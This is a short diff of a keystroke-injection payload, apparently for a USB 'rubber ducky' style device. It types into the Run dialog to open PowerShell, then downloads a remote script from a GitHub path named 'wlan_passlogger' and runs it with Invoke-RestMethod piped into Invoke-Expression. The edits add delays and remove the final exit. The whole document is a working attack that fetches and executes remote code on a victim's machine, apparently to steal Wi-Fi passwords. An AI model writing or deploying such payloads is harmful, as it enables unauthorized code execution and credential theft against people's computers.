@@ -1,16 +1,13 @@
 
-GUI d
-
 GUI r
-
+DELAY 500
 STRING powershell
 ENTER
 DELAY 1000
 
 STRING $gitUrl = "https://raw.githubusercontent.com/castrosp/payloads/refs/heads/main/wlan_passlogger/option2/script.ps1"
+DELAY 200
 ENTER
 STRING Invoke-RestMethod -Uri $gitUrl | Invoke-Expression
+DELAY 200
 ENTER
-
-DELAY 5000
-STRING exit
